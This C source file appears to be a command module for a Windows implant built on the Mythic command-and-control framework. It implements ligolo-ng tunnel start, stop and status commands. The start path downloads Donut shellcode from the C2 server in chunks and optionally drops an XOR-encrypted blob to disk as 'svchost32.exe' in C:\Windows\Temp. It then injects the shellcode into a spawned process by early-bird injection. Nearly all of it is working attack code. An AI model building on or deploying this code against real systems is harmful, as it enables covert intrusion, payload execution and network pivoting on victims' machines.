#define _WIN32_WINNT 0x0601
#include "commands.h"
#include "inject.h"
#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

#define LIGOLO_CHUNK_SIZE (4 * 1024 * 1024)

#if defined(INCLUDE_CMD_LIGOLO_START) || defined(INCLUDE_CMD_LIGOLO_STOP) || defined(INCLUDE_CMD_LIGOLO_STATUS)

typedef struct LigoloSession {
    HANDLE              hProcess;
    DWORD               pid;
    char                remote_path[512];
    char                connect[256];
    struct LigoloSession *next;
} LigoloSession;

static LigoloSession *g_sessions = NULL;

static int ligolo_extract_int(const char *json, const char *key, int defval) {
    char pat[64];
    snprintf(pat, sizeof(pat), "\"%s\"", key);
    const char *kp = strstr(json, pat);
    if (!kp) return defval;
    const char *vp = strchr(kp, ':');
    if (!vp) return defval;
    while (*++vp == ' ' || *vp == '\t');
    return atoi(vp);
}

static char *ligolo_extract_b64(const char *json, const char *key) {
    char pat[72];
    snprintf(pat, sizeof(pat), "\"%s\":\"", key);
    const char *start = strstr(json, pat);
    if (!start) return NULL;
    start += strlen(pat);
    const char *end = strchr(start, '"');
    if (!end) return NULL;
    size_t len = (size_t)(end - start);
    char *result = (char *)malloc(len + 1);
    if (!result) return NULL;
    memcpy(result, start, len);
    result[len] = '\0';
    return result;
}


static int session_alive(LigoloSession *s) {
    if (!s || s->hProcess == INVALID_HANDLE_VALUE) return 0;
    return WaitForSingleObject(s->hProcess, 0) == WAIT_TIMEOUT;
}

static void session_free(LigoloSession *s) {
    if (s->hProcess != INVALID_HANDLE_VALUE)
        CloseHandle(s->hProcess);
    free(s);
}

static void purge_dead(void) {
    LigoloSession **pp = &g_sessions;
    while (*pp) {
        if (!session_alive(*pp)) {
            LigoloSession *dead = *pp;
            *pp = dead->next;
            session_free(dead);
        } else {
            pp = &(*pp)->next;
        }
    }
}

static void ligolo_impl(char *task_id, char *params, const char *action) {

    /* --- STATUS --- */
    if (strcmp(action, "status") == 0) {
        purge_dead();

        char  *json = NULL;
        size_t cap  = 256;
        size_t pos  = 0;
        json = malloc(cap);
        if (!json) { send_task_response(task_id, "Error: out of memory"); return; }
        pos += snprintf(json + pos, cap - pos, "[");

        int first = 1;
        for (LigoloSession *s = g_sessions; s; s = s->next) {
            char esc_path[1024] = {0};
            int  ep = 0;
            for (const char *p = s->remote_path; *p && ep < (int)sizeof(esc_path) - 2; p++) {
                if (*p == '\\') esc_path[ep++] = '\\';
                esc_path[ep++] = *p;
            }
            /* grow buffer if needed */
            size_t needed = pos + strlen(esc_path) + strlen(s->connect) + 128;
            if (needed > cap) {
                cap = needed * 2;
                char *tmp = realloc(json, cap);
                if (!tmp) { free(json); send_task_response(task_id, "Error: out of memory"); return; }
                json = tmp;
            }
            pos += snprintf(json + pos, cap - pos,
                "%s{\"pid\":%lu,\"status\":\"running\",\"connect\":\"%s\",\"path\":\"%s\"}",
                first ? "" : ",",
                s->pid, s->connect, esc_path);
            first = 0;
        }

        if (pos + 2 > cap) {
            char *tmp = realloc(json, cap + 2);
            if (!tmp) { free(json); send_task_response(task_id, "Error: out of memory"); return; }
            json = tmp;
        }
        json[pos++] = ']';
        json[pos]   = '\0';
        send_task_response(task_id, json);
        free(json);
        return;
    }

    /* --- STOP --- */
    if (strcmp(action, "stop") == 0) {
        int target_pid = ligolo_extract_int(params, "pid", 0);

        int killed = 0;
        LigoloSession **pp = &g_sessions;
        while (*pp) {
            if (target_pid == 0 || (int)(*pp)->pid == target_pid) {
                LigoloSession *dead = *pp;
                *pp = dead->next;
                TerminateProcess(dead->hProcess, 0);
                session_free(dead);
                killed++;
            } else {
                pp = &(*pp)->next;
            }
        }
        char msg[64];
        snprintf(msg, sizeof(msg), killed ? "%d session(s) terminated." : "No matching session found.", killed);
        send_task_response(task_id, msg);
        return;
    }

    /* --- START --- */
    char connect[256]           = {0};
    char remote_path[512]       = "C:\\Windows\\Temp\\svchost32.exe";
    char bind_addr[256]         = {0};
    char shellcode_file_id[128] = {0};
    char binary_xor_key[64]     = {0};
    char ligolo_args[1024]      = {0};
    int  sc_chunk_size          = LIGOLO_CHUNK_SIZE;

    extract_json_string(params, "connect",           connect,           sizeof(connect));
    extract_json_string(params, "remote_path",       remote_path,       sizeof(remote_path));
    extract_json_string(params, "bind",              bind_addr,         sizeof(bind_addr));
    extract_json_string(params, "shellcode_file_id", shellcode_file_id, sizeof(shellcode_file_id));
    extract_json_string(params, "binary_xor_key",    binary_xor_key,    sizeof(binary_xor_key));
    extract_json_string(params, "ligolo_args",       ligolo_args,       sizeof(ligolo_args));
    {
        int v = ligolo_extract_int(params, "sc_chunk_size", 0);
        if (v > 0) sc_chunk_size = v;
    }

    if (connect[0] == '\0' && bind_addr[0] == '\0') {
        send_task_response(task_id, "Error: -connect or -bind is required");
        return;
    }

    /* --- FORK+RUN PATH --- */
    if (shellcode_file_id[0]) {
        unsigned char *shellcode     = NULL;
        size_t         shellcode_len = 0;

        {
            /* Download Donut shellcode from Mythic in chunks */
            int total_chunks = -1;
            int chunk_num    = 1;
            while (1) {
                char json_msg[2048];
                if (chunk_num == 1 || total_chunks <= 0) {
                    snprintf(json_msg, sizeof(json_msg),
                        "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                        "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
                        "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
                        task_id, sc_chunk_size, shellcode_file_id, chunk_num);
                } else {
                    snprintf(json_msg, sizeof(json_msg),
                        "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
                        "\"status\":\"Downloading shellcode: chunk %d / %d\","
                        "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
                        "\"chunk_num\":%d,\"full_path\":\"<ligolo_fork_run>\"}}]}",
                        task_id, chunk_num, total_chunks,
                        sc_chunk_size, shellcode_file_id, chunk_num);
                }
                char *b64_resp = send_c2_message(json_msg);
                if (!b64_resp) { free(shellcode); send_task_response(task_id, "Error: C2 unreachable"); return; }
                char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));
                free(b64_resp);
                if (!json_resp) { free(shellcode); send_task_response(task_id, "Error: decrypt failed"); return; }
                if (chunk_num == 1) {
                    total_chunks = ligolo_extract_int(json_resp, "total_chunks", -1);
                    if (total_chunks <= 0) {
                        free(json_resp); free(shellcode);
                        send_task_response(task_id, "Error: failed to retrieve shellcode");
                        return;
                    }
                }
                char *b64_chunk = ligolo_extract_b64(json_resp, "chunk_data");
                free(json_resp);
                if (!b64_chunk) { free(shellcode); send_task_response(task_id, "Error: missing chunk_data"); return; }
                size_t         decoded_len = 0;
                unsigned char *decoded     = base64_decode_bin(b64_chunk, strlen(b64_chunk), &decoded_len);
                free(b64_chunk);
                if (decoded && decoded_len > 0) {
                    unsigned char *tmp = realloc(shellcode, shellcode_len + decoded_len);
                    if (!tmp) { free(decoded); free(shellcode); send_task_response(task_id, "Error: out of memory"); return; }
                    shellcode = tmp;
                    memcpy(shellcode + shellcode_len, decoded, decoded_len);
                    shellcode_len += decoded_len;
                    free(decoded);
                }
                if (chunk_num >= total_chunks) break;
                chunk_num++;
            }
            if (!shellcode || shellcode_len == 0) {
                free(shellcode);
                send_task_response(task_id, "Error: empty shellcode");
                return;
            }
        }

        /* Disk-drop: write encrypted blob to disk, then XOR-decrypt in-place before injection */
        int disk_drop = binary_xor_key[0] != '\0';
        if (disk_drop) {
            HANDLE hFile = CreateFileA(remote_path, GENERIC_WRITE, 0, NULL,
                                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD wr2 = 0;
                WriteFile(hFile, shellcode, (DWORD)shellcode_len, &wr2, NULL);
                CloseHandle(hFile);
            }
            /* Decode hex XOR key and decrypt shellcode in-place */
            unsigned char xor_key[16] = {0};
            size_t klen = strlen(binary_xor_key) / 2;
            if (klen > 16) klen = 16;
            for (size_t ki = 0; ki < klen; ki++) {
                unsigned int bv = 0;
                sscanf(binary_xor_key + ki * 2, "%02x", &bv);
                xor_key[ki] = (unsigned char)bv;
            }
            for (size_t bi = 0; bi < shellcode_len; bi++)
                shellcode[bi] ^= xor_key[bi % klen];
        }

        /* Build lpCommandLine: "{spawnto} {ligolo_args}" so ligolo-ng sees its args via argv */
        char cmdline_buf[2048] = {0};
        snprintf(cmdline_buf, sizeof(cmdline_buf), "%s %s", g_spawnto_path, ligolo_args);

        EarlyBirdResult inj  = {0};
        char            injerr[256] = {0};
        if (!earlybird_inject(shellcode, shellcode_len, cmdline_buf, 0, &inj, injerr, sizeof(injerr))) {
            SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
            send_task_response(task_id, injerr);
            return;
        }
        SecureZeroMemory(shellcode, shellcode_len);
        free(shellcode);

        LigoloSession *s2 = calloc(1, sizeof(LigoloSession));
        if (!s2) {
            TerminateProcess(inj.hProcess, 0); CloseHandle(inj.hThread); CloseHandle(inj.hProcess);
            send_task_response(task_id, "Error: out of memory");
            return;
        }
        s2->hProcess = inj.hProcess;
        s2->pid      = inj.pid;
        strncpy(s2->remote_path, g_spawnto_path, sizeof(s2->remote_path) - 1);
        strncpy(s2->connect, connect[0] ? connect : bind_addr, sizeof(s2->connect) - 1);
        s2->next   = g_sessions;
        g_sessions = s2;
        CloseHandle(inj.hThread);

        char msg2[512];
        if (disk_drop) {
            snprintf(msg2, sizeof(msg2),
                     "Ligolo-ng disk-drop+inject: dropped to %s, injected into %s (PID %lu)\nConnect: %s",
                     remote_path, g_spawnto_path, inj.pid, connect[0] ? connect : bind_addr);
        } else {
            snprintf(msg2, sizeof(msg2),
                     "Ligolo-ng fork+run: injected into %s (PID %lu)\nConnect: %s",
                     g_spawnto_path, inj.pid, connect[0] ? connect : bind_addr);
        }
        send_task_response(task_id, msg2);
        return;
    }

    send_task_response(task_id, "Error: no shellcode file provided");
}

#ifdef INCLUDE_CMD_LIGOLO_START
void command_ligolo_start(char *task_id, char *params) {
    ligolo_impl(task_id, params, "start");
}
#endif

#ifdef INCLUDE_CMD_LIGOLO_STOP
void command_ligolo_stop(char *task_id, char *params) {
    ligolo_impl(task_id, params, "stop");
}
#endif

#ifdef INCLUDE_CMD_LIGOLO_STATUS
void command_ligolo_status(char *task_id, char *params) {
    ligolo_impl(task_id, params, "status");
}
#endif

#endif
